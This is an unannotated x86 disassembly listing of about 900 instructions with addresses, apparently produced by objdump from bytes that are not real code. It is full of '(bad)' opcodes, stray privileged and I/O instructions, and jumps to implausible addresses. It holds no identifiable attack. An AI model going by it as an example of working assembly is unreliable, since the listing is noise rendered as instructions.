  42e1c9:	div    BYTE PTR [ebp-0x8]
  42e1cc:	push   ds
  42e1cd:	inc    esp
  42e1ce:	lock xchg ebx,eax
  42e1d0:	adc    edi,ebx
  42e1d2:	dec    edi
  42e1d3:	pop    ss
  42e1d4:	ret    
  42e1d5:	dec    edx
  42e1d6:	(bad)  
  42e1d7:	leave  
  42e1d8:	push   esi
  42e1d9:	dec    edx
  42e1da:	call   0x39c7ac
  42e1df:	add    BYTE PTR [eax],al
  42e1e1:	add    BYTE PTR [eax],al
  42e1e3:	add    BYTE PTR [edi],dl
  42e1e5:	jmp    0x6cf462bd
  42e1ea:	cli    
  42e1eb:	jae    0x42e171
  42e1ed:	pop    ds
  42e1ee:	(bad)  
  42e1ef:	imul   ebx,DWORD PTR [ecx+esi*1-0x9],0x5c1d6850
  42e1f7:	or     BYTE PTR [edx+0x983ec43],dl
  42e1fd:	jp     0x42e1fd
  42e1ff:	sbb    BYTE PTR [ecx],0x62
  42e202:	cld    
  42e203:	sbb    BYTE PTR [ecx],0x6e
  42e206:	add    al,BYTE PTR [eax+0xefe75f1]
  42e20c:	into   
  42e20d:	pop    ss
  42e20e:	cld    
  42e20f:	push   DWORD PTR [ebx]
  42e211:	sbb    eax,0xc699d444
  42e216:	outs   dx,BYTE PTR ds:[esi]
  42e217:	or     dl,BYTE PTR [edi+0x5dff4a9e]
  42e21d:	sahf   
  42e21e:	jns    0x42e285
  42e220:	enter  0x8301,0x83
  42e224:	jne    0x42e24d
  42e226:	add    al,0x0
  42e228:	jne    0x42e24c
  42e22a:	sbb    BYTE PTR [edi],0x74
  42e22d:	stos   DWORD PTR es:[edi],eax
  42e22e:	inc    BYTE PTR [esi+0x378165b6]
  42e234:	je     0x42e1e1
  42e236:	inc    BYTE PTR [eax]
  42e238:	int    0xee
  42e23a:	add    eax,DWORD PTR [eax]
  42e23c:	jne    0x42e26d
  42e23e:	mov    edi,0x70ac6f73
  42e243:	jle    0x42e1d2
  42e245:	stos   BYTE PTR es:[edi],al
  42e246:	(bad)  
  42e247:	inc    DWORD PTR [eax]
  42e249:	add    BYTE PTR [eax],al
  42e24b:	add    BYTE PTR [eax],al
  42e24d:	out    dx,al
  42e24e:	and    BYTE PTR [ebx+0x1],al
  42e251:	jne    0x42e1fe
  42e253:	jnp    0x42e1e0
  42e255:	test   bl,0x3
  42e258:	add    BYTE PTR [ebp+0x15],dh
  42e25b:	xor    BYTE PTR [edi],0x74
  42e25e:	stos   DWORD PTR es:[edi],eax
  42e25f:	inc    BYTE PTR [esi+0x41cef28]
  42e265:	das    
  42e266:	adc    BYTE PTR [eax*4+0xb0dbfb5],al
  42e26d:	retf   
  42e26e:	js     0x42e256
  42e270:	add    BYTE PTR [ebp-0x55],dh
  42e273:	jns    0x42e2b4
  42e275:	jge    0x42e289
  42e277:	jnp    0x42e227
  42e279:	xchg   ebp,eax
  42e27a:	stos   BYTE PTR es:[edi],al
  42e27b:	(bad)  
  42e27c:	jmp    DWORD PTR [ebx+0x28]
  42e27f:	out    0x0,eax
  42e281:	jne    0x42e22e
  42e283:	add    eax,0xdd2f5179
  42e289:	cmc    
  42e28a:	jne    0x42e235
  42e28c:	add    al,cl
  42e28e:	retf   0xc1c
  42e291:	call   0x923903
  42e296:	pushw  0x4f
  42e299:	sub    bh,BYTE PTR [esi-0x544aee1e]
  42e29f:	add    ebx,0x3f740269
  42e2a5:	leave  
  42e2a6:	xor    DWORD PTR [edi+0x1f],ecx
  42e2a9:	xchg   ebx,eax
  42e2aa:	push   cs
  42e2ab:	xor    DWORD PTR [ecx+ebp*2+0xa9c9b5],ebx
  42e2b2:	add    BYTE PTR [eax],al
  42e2b4:	add    BYTE PTR [eax],al
  42e2b6:	jmp    0x51df97d1
  42e2bb:	cmp    eax,0x3c4fa9ba
  42e2c0:	push   cs
  42e2c1:	mov    ebx,0x51e90620
  42e2c6:	inc    esi
  42e2c7:	mov    DWORD PTR [eax+0x5adacff5],ebx
  42e2cd:	dec    eax
  42e2ce:	je     0x42e2d2
  42e2d0:	jmp    0x32784003
  42e2d5:	push   ecx
  42e2d6:	es popf 
  42e2d8:	(bad)  [edi+0x7ae94282]
  42e2de:	hlt    
  42e2df:	cmp    eax,0xd97503e8
  42e2e4:	mov    eax,ds:0x28d0712f
  42e2e9:	popf   
  42e2ea:	nop
  42e2eb:	ins    BYTE PTR es:[edi],dx
  42e2ec:	out    0x48,eax
  42e2ee:	das    
  42e2ef:	sar    DWORD PTR [ebx+0x3c808e7c],0xd8
  42e2f6:	sub    ecx,DWORD PTR [ecx+0xaf37d20]
  42e2fc:	call   0xabcc5804
  42e301:	(bad)  
  42e302:	sti    
  42e303:	jg     0x42e2e1
  42e305:	add    dh,BYTE PTR [ebp+0x2]
  42e308:	mov    ebx,0x6ba6b97a
  42e30d:	test   DWORD PTR [esi-0x59fc16ff],ecx
  42e313:	iret   
  42e314:	adc    dl,BYTE PTR [esp+ebp*8+0x15]
  42e318:	and    ecx,eax
  42e31a:	add    BYTE PTR [eax],al
  42e31c:	add    BYTE PTR [eax],al
  42e31e:	add    BYTE PTR [ecx+0x7503e7a2],bh
  42e324:	add    al,BYTE PTR [eax]
  42e326:	pusha  
  42e327:	bound  ebp,QWORD PTR [edx+0xb6ad4fa]
  42e32d:	inc    eax
  42e32e:	jmp    0x213af9c2
  42e333:	xor    BYTE PTR [ebx],0x1
  42e336:	jmp    0x4fc4eab1
  42e33b:	jbe    0x42e33f
  42e33d:	add    BYTE PTR [edx-0x7],dh
  42e340:	das    
  42e341:	add    ecx,ebp
  42e343:	jbe    0x42e2c8
  42e345:	dec    esp
  42e346:	mov    cl,0x61
  42e348:	iret   
  42e349:	xchg   DWORD PTR [edi+0x6bff989b],esp
  42e34f:	add    al,0x9
  42e351:	test   BYTE PTR ds:0x62000276,dh
  42e357:	xor    al,0xa
  42e359:	test   DWORD PTR [ecx-0x169a0e76],ebp
  42e35f:	inc    esi
  42e360:	xchg   edi,eax
  42e361:	adc    al,0xc9
  42e363:	add    DWORD PTR [edx+0x0],0x8408b66c
  42e36a:	lods   eax,DWORD PTR ds:[esi]
  42e36b:	ja     0x42e36f
  42e36d:	add    BYTE PTR [edi],ch
  42e36f:	push   ebx
  42e370:	popf   
  42e371:	jmp    DWORD PTR [esi]
  42e373:	dec    ebx
  42e374:	xchg   edi,eax
  42e375:	jmp    ebp
  42e377:	add    al,0x46
  42e379:	sti    
  42e37a:	sub    dh,dl
  42e37c:	pushf  
  42e37d:	test   DWORD PTR [ebp-0x5b77488d],esi
  42e383:	add    BYTE PTR [eax],al
  42e385:	add    BYTE PTR [eax],al
  42e387:	add    BYTE PTR [edx],al
  42e389:	xchg   al,cl
  42e38b:	out    0xe2,al
  42e38d:	mov    edi,0x776e8ff
  42e392:	mov    dl,0xa8
  42e394:	dec    edx
  42e395:	inc    ebx
  42e396:	je     0x42e385
  42e398:	mov    ss,WORD PTR ds:0x36b46413
  42e39e:	bound  ebp,QWORD PTR [edx+0x4e]
  42e3a1:	lock out 0x0,al
  42e3a4:	and    edx,DWORD PTR [ecx+eax*2]
  42e3a7:	inc    esp
  42e3a8:	repnz test DWORD PTR [edx],esi
  42e3ab:	add    ah,BYTE PTR [ecx+0x2045879c]
  42e3b1:	ja     0x42e3b1
  42e3b3:	add    cl,0x52
  42e3b6:	cli    
  42e3b7:	sub    BYTE PTR [ecx-0x6ff105ae],0x71
  42e3be:	cli    
  42e3bf:	dec    DWORD PTR [esp+edx*4]
  42e3c2:	lods   eax,DWORD PTR ds:[esi]
  42e3c3:	inc    esi
  42e3c4:	rcl    BYTE PTR [edi],1
  42e3c6:	push   ecx
  42e3c7:	adc    BYTE PTR [edi-0x53],ah
  42e3ca:	dec    edx
  42e3cb:	push   edx
  42e3cc:	sub    edx,ecx
  42e3ce:	repz inc DWORD PTR [ebx+0x70c083f6]
  42e3d5:	cwde   
  42e3d6:	jns    0x42e43d
  42e3d8:	in     al,dx
  42e3d9:	add    eax,0x4ea45be
  42e3de:	jecxz  0x42e459
  42e3e0:	jmp    0x42e3d2
  42e3e2:	fist   DWORD PTR ds:0x41b9065c
  42e3e8:	mov    bl,0xfe
  42e3ea:	(bad)  
  42e3eb:	cmp    al,BYTE PTR [eax]
  42e3ed:	add    BYTE PTR [eax],al
  42e3ef:	add    BYTE PTR [eax],al
  42e3f1:	int    0xe2
  42e3f3:	cmp    esi,DWORD PTR [edx+eax*4+0x17]
  42e3f7:	ret    
  42e3f8:	and    DWORD PTR ds:0x9c001f09,0x35834bea
  42e402:	or     al,0x7
  42e404:	test   dl,ch
  42e406:	add    eax,0x77df0000
  42e40b:	push   es
  42e40c:	je     0x42e478
  42e40e:	sbb    eax,0x285bec44
  42e413:	aas    
  42e414:	add    eax,0x41e82e84
  42e419:	xchg   edi,eax
  42e41a:	popa   
  42e41b:	cmc    
  42e41c:	push   ebx
  42e41d:	fs stc 
  42e41f:	repnz push DWORD PTR [ebp-0x10]
  42e423:	mov    ds:0xfeaa99ae,al
  42e428:	push   DWORD PTR [edx]
  42e42a:	mov    bh,0xaa
  42e42c:	lgs    ebp,FWORD PTR [ebx+0x6c602995]
  42e433:	fcos   
  42e435:	sbb    ch,BYTE PTR [eax]
  42e437:	retf   0xb93c
  42e43a:	or     BYTE PTR [eax+eax*1],al
  42e43d:	mov    ebp,DWORD PTR [ecx-0x54a5be19]
  42e443:	(bad)  
  42e444:	jae    0x42e4b8
  42e446:	push   es
  42e447:	push   ebp
  42e448:	and    esi,DWORD PTR [ebp-0x55]
  42e44b:	das    
  42e44c:	mov    esi,0xffa1d6f5
  42e451:	imul   ebx,DWORD PTR [edi+0x44bc],0xdb000000
  42e45b:	stos   BYTE PTR es:[edi],al
  42e45c:	jnp    0x42e4a2
  42e45e:	lds    esi,FWORD PTR [ebp+edi*8-0x7]
  42e462:	xor    BYTE PTR [esi-0x5c],dh
  42e465:	inc    esp
  42e466:	ret    0x282b
  42e469:	sti    
  42e46a:	ja     0x42e424
  42e46c:	adc    BYTE PTR [ecx],0xb2
  42e46f:	and    BYTE PTR [ecx+0x116287f],0x75
  42e476:	test   DWORD PTR [edi*1+0x2a6bf008],esp
  42e47d:	cmp    eax,0x3af269ba
  42e482:	push   edx
  42e483:	stos   DWORD PTR es:[edi],eax
  42e484:	(bad)  
  42e485:	out    0x50,al
  42e487:	sub    ebp,DWORD PTR [eax]
  42e489:	cli    
  42e48a:	jne    0x42e43b
  42e48c:	aam    0x7e
  42e48e:	repz pop ebx
  42e490:	(bad)  
  42e491:	je     0x42e414
  42e493:	xor    edx,DWORD PTR [edx+0x75d062be]
  42e499:	jle    0x42e45c
  42e49b:	stos   BYTE PTR es:[edi],al
  42e49c:	(bad)  
  42e49d:	(bad)  
  42e49e:	inc    BYTE PTR [ecx]
  42e4a0:	mov    ah,0xab
  42e4a2:	retf   
  42e4a3:	fidiv  WORD PTR [eax+0x3]
  42e4a6:	pop    edx
  42e4a7:	out    dx,al
  42e4a8:	pop    ebp
  42e4a9:	cmp    eax,0x2f287f6d
  42e4ae:	or     BYTE PTR [ebp+0x47fdb3b3],0xed
  42e4b5:	push   ebx
  42e4b6:	push   ds
  42e4b7:	out    dx,eax
  42e4b8:	cld    
  42e4b9:	adc    dh,BYTE PTR [ebp+0x3fea02]
  42e4bf:	add    BYTE PTR [eax],al
  42e4c1:	add    BYTE PTR [eax],al
  42e4c3:	or     eax,0x43ac2b8d
  42e4c8:	test   DWORD PTR [eax+0x3],eax
  42e4cb:	jne    0x42e4cf
  42e4cd:	loop   0x42e450
  42e4cf:	js     0x42e469
  42e4d1:	leave  
  42e4d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4d3:	sti    
  42e4d4:	pushf  
  42e4d5:	shl    BYTE PTR ds:0xa4e90274,1
  42e4db:	imul   ebp,DWORD PTR [edx-0xa82f04f],0x382e0428
  42e4e5:	ds mov ebx,0x986e2f0b
  42e4eb:	inc    ebx
  42e4ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4ed:	lock dec ebp
  42e4ef:	lea    edx,es:[eax+0x6bf27379]
  42e4f6:	les    edi,FWORD PTR [edi+0x7e]
  42e4f9:	js     0x42e4ff
  42e4fb:	jne    0x42e4ff
  42e4fd:	jnp    0x42e540
  42e4ff:	jl     0x42e504
  42e501:	fidivr DWORD PTR [edi-0x6c]
  42e504:	add    ecx,ebp
  42e506:	add    esi,ebx
  42e508:	inc    esp
  42e509:	add    BYTE PTR [ecx-0x5a1765e7],al
  42e50f:	mov    dl,0x89
  42e511:	mov    ds:0x48001a4,eax
  42e516:	add    esi,DWORD PTR [ebp+0x2]
  42e519:	cdq    
  42e51a:	jp     0x42e4d5
  42e51c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e51d:	push   DWORD PTR ds:0xa90eee6a
  42e523:	jbe    0x42e53c
  42e525:	mov    ebx,0xc1
  42e52a:	add    BYTE PTR [eax],al
  42e52c:	ja     0x42e530
  42e52e:	add    cl,ch
  42e530:	dec    ecx
  42e531:	sbb    BYTE PTR [ebp-0x78fd8917],0x66
  42e538:	lds    eax,FWORD PTR [ecx]
  42e53a:	add    cl,ch
  42e53c:	lods   eax,DWORD PTR ds:[esi]
  42e53d:	inc    esi
  42e53e:	clc    
  42e53f:	jb     0x42e566
  42e541:	or     BYTE PTR [eax-0xe813584],0x75
  42e548:	dec    edx
  42e549:	jg     0x42e58c
  42e54b:	icebp  
  42e54c:	mov    edx,DWORD PTR [edi+0x73]
  42e54f:	and    al,0x5f
  42e551:	add    dl,BYTE PTR [eax-0x2a]
  42e554:	imul   esp,edx,0xe
  42e557:	sub    DWORD PTR [ecx+0x7d],edi
  42e55a:	mov    edi,0x4180d93c
  42e55f:	cmp    DWORD PTR [esi+0x3e],ebx
  42e562:	lock ins BYTE PTR es:[edi],dx
  42e564:	mov    dh,0x13
  42e566:	sub    ah,BYTE PTR [edx-0x60]
  42e569:	xacquire xchg BYTE PTR [eax*1+0x11f7c019],ch
  42e571:	mov    edx,0xa7d59f16
  42e576:	gs cmc 
  42e578:	sub    eax,DWORD PTR [ecx+0x4]
  42e57b:	sbb    DWORD PTR [edx],esp
  42e57d:	fcom   DWORD PTR ds:0x43eed819
  42e583:	fbstp  TBYTE PTR [esi]
  42e585:	add    bh,BYTE PTR [edi-0x5b]
  42e588:	mov    bh,BYTE PTR [esi-0x41]
  42e58b:	fmul   QWORD PTR [esi+0x5e447d]
  42e591:	add    BYTE PTR [eax],al
  42e593:	add    BYTE PTR [eax],al
  42e595:	mov    es,WORD PTR [ecx-0x1]
  42e598:	fsub   QWORD PTR [esi-0x65]
  42e59b:	inc    esp
  42e59c:	push   ecx
  42e59d:	in     eax,dx
  42e59e:	ds clc 
  42e5a0:	add    BYTE PTR [edi+0x15],dh
  42e5a3:	push   ebx
  42e5a4:	add    DWORD PTR [ebx+eax*1+0x6a],ecx
  42e5a8:	xchg   ebx,eax
  42e5a9:	mov    bh,0x92
  42e5ab:	xor    DWORD PTR [ebp-0x74],0x878bc11a
  42e5b2:	jnp    0x42e5c8
  42e5b4:	xor    esp,DWORD PTR [edx+0x5e]
  42e5b7:	add    DWORD PTR [esi+0x54],0x1774bb18
  42e5be:	and    BYTE PTR [eax+0xc],0x1c
  42e5c2:	xor    esi,edi
  42e5c4:	adc    eax,0x3ff428
  42e5c9:	xchg   edi,eax
  42e5ca:	call   0xc197cec2
  42e5cf:	cmc    
  42e5d0:	inc    DWORD PTR [edi+0xc014e8b]
  42e5d6:	add    eax,DWORD PTR [ebx+0x1e7f244d]
  42e5dc:	mov    ah,bl
  42e5de:	xchg   DWORD PTR [ebx-0x8],eax
  42e5e1:	ja     0x42e56e
  42e5e3:	push   edx
  42e5e4:	add    esp,ecx
  42e5e6:	add    dh,BYTE PTR [ebp+eax*1-0x4c]
  42e5ea:	dec    edx
  42e5eb:	add    BYTE PTR [eax],al
  42e5ed:	fsub   QWORD PTR [ebx+0x73]
  42e5f0:	in     al,dx
  42e5f1:	adc    ebx,DWORD PTR [ecx-0x173ecee]
  42e5f7:	loop   0x42e631
  42e5f9:	add    BYTE PTR [eax],al
  42e5fb:	add    BYTE PTR [eax],al
  42e5fd:	add    bl,bl
  42e5ff:	push   ebp
  42e600:	mov    ecx,DWORD PTR [ebx-0x56]
  42e603:	xchg   edi,eax
  42e604:	mov    edx,0x4287dd23
  42e609:	add    ecx,DWORD PTR [eiz*2+0x7f93752c]
  42e610:	mov    edx,0xed876c04
  42e615:	call   0x42f1c0
  42e61a:	sbb    BYTE PTR [esi+0x5c75186e],bh
  42e620:	popf   
  42e621:	mov    dl,0xf5
  42e623:	stos   BYTE PTR es:[edi],al
  42e624:	(bad)  
  42e625:	call   FWORD PTR [ebp-0x60]
  42e628:	push   eax
  42e629:	cli    
  42e62a:	bound  esp,QWORD PTR [eax]
  42e62c:	les    esi,FWORD PTR [ebx+0x6d]
  42e62f:	je     0x42e5ba
  42e631:	mov    esi,0x7fe5d
  42e636:	jne    0x42e5f4
  42e638:	inc    eax
  42e639:	leave  
  42e63a:	ss mov ecx,0xb3272ecb
  42e640:	lea    edx,[edi+0x74]
  42e643:	stos   DWORD PTR es:[edi],eax
  42e644:	(bad)  
  42e645:	jno    0x42e6a8
  42e647:	jne    0x42e5d8
  42e649:	mov    dl,0xc9
  42e64b:	stos   BYTE PTR es:[edi],al
  42e64c:	(bad)  
  42e64d:	inc    esi
  42e64f:	and    BYTE PTR [esi],al
  42e651:	jg     0x42e6a4
  42e653:	cmp    eax,DWORD PTR [esp+esi*2]
  42e656:	jb     0x42e668
  42e658:	sti    
  42e659:	(bad)  
  42e65a:	in     al,dx
  42e65b:	xchg   edi,eax
  42e65c:	xchg   BYTE PTR [eax-0x49],al
  42e65f:	lock jbe 0x42e6b9
  42e662:	add    BYTE PTR [eax],al
  42e664:	add    BYTE PTR [eax],al
  42e666:	add    BYTE PTR [ebx+ebp*4-0x2],dh
  42e66a:	ins    DWORD PTR es:[edi],dx
  42e66b:	fucom  st(0)
  42e66d:	fcmovbe st,st(0)
  42e66f:	imul   esp,DWORD PTR [ebp-0x55c27575],0x625efffe
  42e679:	adc    ch,al
  42e67b:	sbb    al,0x8b
  42e67d:	lahf   
  42e67e:	cli    
  42e67f:	and    ebp,DWORD PTR [eax+0x31]
  42e682:	push   ebp
  42e683:	and    ah,BYTE PTR [eax]
  42e685:	loopne 0x42e6c6
  42e687:	mov    ebp,ebx
  42e689:	add    ebp,DWORD PTR [edi]
  42e68b:	into   
  42e68c:	icebp  
  42e68d:	repz mov ebx,?
  42e690:	xchg   ebx,eax
  42e691:	add    eax,DWORD PTR [eax]
  42e693:	jne    0x42e6f9
  42e695:	or     al,al
  42e697:	add    ah,ch
  42e699:	add    ecx,DWORD PTR [edi+0x25]
  42e69c:	add    dh,BYTE PTR [eax-0x7f]
  42e69f:	and    al,BYTE PTR [ebx]
  42e6a1:	jmp    0xccb7d2a9
  42e6a6:	add    al,0x75
  42e6a8:	add    cl,BYTE PTR [edx-0x46]
  42e6ab:	ror    BYTE PTR [edx],1
  42e6ad:	je     0x42e638
  42e6af:	mov    al,BYTE PTR [ebx]
  42e6b1:	jmp    0x327590b9
  42e6b6:	mov    edx,0x895bfad8
  42e6bb:	push   0x3
  42e6bd:	jmp    0x1a7598c5
  42e6c2:	mov    edx,0x2dccbebb
  42e6c7:	mov    DWORD PTR [edx+0xdb6a],ecx
  42e6cd:	add    BYTE PTR [eax],al
  42e6cf:	add    BYTE PTR [ebp+0x2],dh
  42e6d2:	jmp    0xfabf7582
  42e6d7:	mov    eax,ds:0x7aa87aa
  42e6dc:	sbb    eax,0xfa21abf
  42e6e1:	mov    DWORD PTR [ebx],edx
  42e6e3:	add    BYTE PTR [edx+0x42],dh
  42e6e6:	jmp    0xe818db79
  42e6eb:	add    esi,DWORD PTR [ebp+0x32]
  42e6ee:	retf   0xf9b7
  42e6f1:	jnp    0x42e743
  42e6f3:	add    esi,DWORD PTR [ebp+0x2]
  42e6f6:	sbb    DWORD PTR [ebx+0x3e82dfc],ecx
  42e6fc:	jne    0x42e689
  42e6fe:	dec    edx
  42e6ff:	cmp    al,0x74
  42e701:	add    ch,cl
  42e703:	mov    bl,ah
  42e705:	xor    eax,0x957503e8
  42e70a:	mov    ebx,0xf8de368d
  42e70f:	mov    dh,ah
  42e711:	test   edi,esp
  42e713:	add    esi,DWORD PTR [ebp-0x79]
  42e716:	bound  esi,QWORD PTR [ebp+esi*2+0x2]
  42e71a:	add    cl,ch
  42e71c:	inc    esi
  42e71d:	mov    ebx,DWORD PTR [ecx+0x27669]
  42e723:	jo     0x42e71c
  42e725:	add    BYTE PTR [eax],0xe9
  42e728:	jbe    0x42e6c3
  42e72a:	aam    0xc1
  42e72c:	and    BYTE PTR [ebp-0x7e041606],dl
  42e732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e733:	call   0x42e738
  42e738:	add    BYTE PTR [esi+0x2],dh
  42e73b:	dec    edi
  42e73c:	cdq    
  42e73d:	adc    eax,0x652d7eb1
  42e742:	aaa    
  42e743:	pop    ebp
  42e744:	bound  edi,QWORD PTR [edi]
  42e746:	sub    eax,0x2f76edbe
  42e74b:	xchg   DWORD PTR [eax],esp
  42e74d:	or     DWORD PTR ds:0x9076e900,eax
  42e753:	inc    ebx
  42e754:	lds    edi,FWORD PTR [esi+0x1]
  42e757:	je     0x42e748
  42e759:	pop    ebp
  42e75a:	stos   BYTE PTR es:[edi],al
  42e75b:	xchg   edx,eax
  42e75c:	or     dl,bh
  42e75e:	cwde   
  42e75f:	xchg   BYTE PTR [esi],ch
  42e761:	mov    ah,0x54
  42e763:	add    ebp,ecx
  42e765:	inc    ecx
  42e766:	xor    BYTE PTR [esi-0x13],ah
  42e769:	sub    eax,0xb66cc001
  42e76e:	add    cl,BYTE PTR [ebp+0x17e9e]
  42e774:	jmp    0x6c4c6322
  42e779:	scas   eax,DWORD PTR es:[edi]
  42e77a:	lar    esi,WORD PTR [edx+0x77]
  42e77e:	sbb    al,0x1
  42e780:	mov    dh,0xc6
  42e782:	adc    al,0xc2
  42e784:	in     eax,0x39
  42e786:	or     eax,0x2bf5e0ea
  42e78b:	add    ecx,ebp
  42e78d:	jbe    0x42e79f
  42e78f:	sbb    ah,BYTE PTR [edx-0x3]
  42e792:	das    
  42e793:	add    ecx,ebp
  42e795:	jbe    0x42e71c
  42e797:	add    eax,DWORD PTR [eax]
  42e799:	adc    al,0x7e
  42e79b:	xor    al,BYTE PTR [eax]
  42e79d:	add    BYTE PTR [eax],al
  42e79f:	add    BYTE PTR [eax],al
  42e7a1:	add    BYTE PTR [eax-0xbcf7cf6],ah
  42e7a7:	push   es
  42e7a8:	sar    edi,0x1b
  42e7ab:	xor    ebx,DWORD PTR ds:[edi+0xb4]
  42e7b2:	sahf   
  42e7b3:	pop    ebp
  42e7b4:	xor    DWORD PTR ds:0x3a8e6c,0x1368ac9
  42e7be:	dec    esp
  42e7bf:	dec    DWORD PTR [edi-0x1]
  42e7c2:	and    BYTE PTR [edx-0x53],0x54
  42e7c6:	pop    ebp
  42e7c7:	(bad)  
  42e7c8:	jmp    edi
  42e7ca:	dec    edx
  42e7cb:	pusha  
  42e7cc:	sti    
  42e7cd:	inc    edi
  42e7cf:	mov    dl,BYTE PTR [esi+0x1]
  42e7d2:	dec    esp
  42e7d3:	inc    DWORD PTR [eax+eax*8-0xaff5f0]
  42e7da:	and    DWORD PTR [ebx],eax
  42e7dc:	or     eax,DWORD PTR [eax+0xc]
  42e7df:	test   BYTE PTR [ebp+0x68],bh
  42e7e2:	or     eax,0xb4fffff
  42e7e7:	pop    edx
  42e7e8:	mov    eax,DWORD PTR [edi+0xac]
  42e7ee:	cmp    al,0x73
  42e7f0:	sar    bh,1
  42e7f2:	jecxz  0x42e7d1
  42e7f4:	add    BYTE PTR [eax],al
  42e7f6:	fsub   QWORD PTR [esi-0x6]
  42e7f9:	loopne 0x42e7b4
  42e7fb:	jb     0x42e855
  42e7fd:	(bad)  
  42e7fe:	sar    DWORD PTR [esi-0x7b],cl
  42e801:	inc    eax
  42e802:	int3   
  42e803:	xlat   BYTE PTR ds:[ebx]
  42e804:	mov    edx,0x55
  42e809:	add    BYTE PTR [eax],al
  42e80b:	push   edi
  42e80c:	push   edx
  42e80d:	dec    edi
  42e80e:	push   ecx
  42e80f:	sub    DWORD PTR [ebx+0x36],edi
  42e812:	add    esp,ecx
  42e814:	dec    BYTE PTR [edi-0x3a]
  42e817:	xchg   ecx,eax
  42e818:	jae    0x42e814
  42e81a:	mov    BYTE PTR [ebp-0x1a],dh
  42e81d:	fwait
  42e81e:	cli    
  42e81f:	or     BYTE PTR [ebp+0x2a753fed],0x5b
  42e826:	push   edi
  42e827:	je     0x42e7d2
  42e829:	(bad)  
  42e82a:	cli    
  42e82b:	xchg   edx,eax
  42e82c:	test   al,0xfe
  42e82e:	jb     0x42e854
  42e830:	and    bl,al
  42e832:	out    0x9f,eax
  42e834:	push   ds
  42e835:	fwait
  42e836:	cli    
  42e837:	icebp  
  42e838:	call   0x29412a54
  42e83d:	cmp    al,0x1
  42e83f:	jne    0x42e7dc
  42e841:	inc    ebx
  42e842:	addr16 sub al,0x50
  42e845:	xor    al,0x8d
  42e847:	and    bh,BYTE PTR [eax+0x3]
  42e84a:	add    BYTE PTR [ebp+0x43],dh
  42e84d:	stos   DWORD PTR es:[edi],eax
  42e84e:	fimul  DWORD PTR [eax-0x1f]
  42e851:	xchg   DWORD PTR [edi+0x3e8fb4c9],edi
  42e857:	jno    0x42e8a4
  42e859:	cdq    
  42e85a:	adc    al,0xf1
  42e85c:	mov    bh,BYTE PTR [esi]
  42e85e:	add    dh,bh
  42e860:	sub    BYTE PTR [ecx+eax*1],bh
  42e863:	jne    0x42e800
  42e865:	test   DWORD PTR [ecx],ecx
  42e867:	in     al,dx
  42e868:	scas   eax,DWORD PTR es:[edi]
  42e869:	cmp    edx,0xffffffca
  42e86c:	ja     0x42e871
  42e86e:	add    BYTE PTR [eax],al
  42e870:	add    BYTE PTR [eax],al
  42e872:	add    BYTE PTR [eax],al
  42e874:	jne    0x42e816
  42e876:	adc    DWORD PTR [edi+0x74],0x60fafe9b
  42e87d:	mov    bh,0xee
  42e87f:	aas    
  42e880:	jne    0x42e8e3
  42e882:	inc    edi
  42e883:	sti    
  42e884:	je     0x42e867
  42e886:	call   0x8617:0xf7c8dd74
  42e88d:	fild   DWORD PTR [ebx]
  42e88f:	xchg   BYTE PTR [eax],bh
  42e891:	pop    eax
  42e892:	retf   
  42e893:	mov    esi,0x7eab2420
  42e898:	rol    DWORD PTR [edx],1
  42e89a:	cmc    
  42e89b:	mov    dh,BYTE PTR [ecx]
  42e89d:	cli    
  42e89e:	xor    dh,BYTE PTR [edi]
  42e8a0:	cli    
  42e8a1:	or     bh,cl
  42e8a3:	sub    dl,0xf8
  42e8a6:	xchg   ecx,eax
  42e8a7:	mov    esi,0x9bc5918b
  42e8ac:	jmp    0x7547a536
  42e8b1:	add    bl,BYTE PTR [ecx]
  42e8b3:	(bad)  
  42e8b4:	xor    DWORD PTR [ecx+0x6b782e8],edx
  42e8ba:	jo     0x42e904
  42e8bc:	adc    DWORD PTR [ecx+0x4283f7f3],0x7b64d2e9
  42e8c6:	rcr    DWORD PTR [ebx+0x4a0559d],cl
  42e8cc:	jne    0x42e8d0
  42e8ce:	mov    bl,0x2d
  42e8d0:	cli    
  42e8d1:	test   BYTE PTR [esp+eax*1+0x75c0275],bl
  42e8d8:	add    BYTE PTR [eax],al
  42e8da:	add    BYTE PTR [eax],al
  42e8dc:	add    BYTE PTR ds:0x2d88f07d,al
  42e8e2:	push   ss
  42e8e3:	mov    ds:0x9cfac1dc,eax
  42e8e8:	jecxz  0x42e8dd
  42e8ea:	inc    edx
  42e8eb:	stc    
  42e8ec:	xor    BYTE PTR ds:0x83baf9f8,0xc2
  42e8f3:	(bad)
  42e8f6:	mul    BYTE PTR [ebp-0x3d]
  42e8f9:	jbe    0x42e92d
  42e8fb:	xchg   edx,eax
  42e8fc:	sahf   
  42e8fd:	imul   eax,DWORD PTR [esi-0x5],0xa4857543
  42e904:	adc    al,bh
  42e906:	rcr    DWORD PTR [ebx-0x1d],0xf3
  42e90a:	test   BYTE PTR [ebx+eax*1],dh
  42e90d:	jne    0x42e911
  42e90f:	outs   dx,BYTE PTR ds:[esi]
  42e910:	fmul   DWORD PTR [edx]
  42e912:	call   0x61ff:0x90cf5d78
  42e919:	cmp    cl,BYTE PTR [edx+0x37d6a86]
  42e91f:	add    cl,ch
  42e921:	cmc    
  42e922:	in     al,0x87
  42e924:	jmp    0xe93e2ee1
  42e929:	std    
  42e92a:	xchg   ecx,eax
  42e92b:	inc    ecx
  42e92c:	pusha  
  42e92d:	mov    cl,BYTE PTR [edx+0x3593a36]
  42e933:	add    cl,ch
  42e935:	fs ins DWORD PTR es:[edi],dx
  42e937:	jg     0x42e92d
  42e939:	jmp    0xee2957ce
  42e93e:	xchg   edi,eax
  42e93f:	out    0x9,eax
  42e941:	add    BYTE PTR [eax],al
  42e943:	add    BYTE PTR [eax],al
  42e945:	add    dl,bl
  42e947:	mov    edi,edx
  42e949:	pop    esi
  42e94a:	mov    dl,BYTE PTR [esi+0x16efcfa]
  42e950:	inc    eax
  42e951:	jmp    0xa73e3042
  42e956:	cwde   
  42e957:	mov    ecx,0x3576e5bd
  42e95c:	xchg   DWORD PTR [ebp-0xc],eax
  42e95f:	fwait
  42e960:	and    ebx,DWORD PTR [edx+0x34e83388]
  42e966:	pop    edx
  42e967:	mov    edx,?
  42e969:	jb     0x42e97c
  42e96b:	jnp    0x42e9e9
  42e96d:	sbb    edx,esi
